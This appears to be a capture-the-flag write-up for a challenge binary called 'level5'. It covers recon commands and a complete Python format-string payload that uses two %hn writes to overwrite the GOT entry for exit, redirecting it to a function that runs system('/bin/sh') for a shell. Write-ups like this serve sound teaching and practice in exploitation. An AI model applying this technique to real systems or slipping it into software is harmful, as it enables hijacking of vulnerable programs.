# level5 — Format String + GOT Overwrite
 
## Vulnerability
 
`n()` passes user input directly to `printf()` without a format string → **Format String vulnerability**.  
`exit()` is called at the end → we **overwrite GOT[exit]** to redirect it to `o()` which calls `system("/bin/sh")`.
 
## Recon
 
```bash
# Find GOT address of exit
objdump -R level5 | grep exit
# 08049838 R_386_JUMP_SLOT   exit
 
# Find printf stack offset (look for 41414141)
echo "AAAA %x %x %x %x %x %x %x %x" | ./level5
# AAAA 200 b7fd1ac0 b7ff37d0 41414141 ...
# offset = 4
```
 
## Exploit
 
Target: write `0x080484a4` (address of `o()`) into `0x08049838` (GOT[exit])
 
Split into two 16-bit writes (`%hn`):
- `0x84a4` = 33956 → write to `0x08049838`
- `0x0804` = 2052  → write to `0x0804983a`
```bash
(python -c "
import struct
addr_low  = struct.pack('<I', 0x08049838)   # GOT[exit] low word
addr_high = struct.pack('<I', 0x0804983a)   # GOT[exit] high word
payload = addr_low + addr_high
payload += '%33948d'   # pad to 33956 total chars (33956 - 8 bytes already written)
payload += '%4\$hn'    # write 0x84a4 at 0x08049838
payload += '%33632d'   # pad to wrap around: 33956 + 33632 = 67588 → 67588 % 65536 = 0x0804
payload += '%5\$hn'    # write 0x0804 at 0x0804983a
print payload
"; cat) | ./level5
```
 
## Flow
 
```
printf(buf)  →  overwrites GOT[exit] with &o()
exit(1)      →  jumps to o()
o()          →  system("/bin/sh")  →  SHELL
```
 
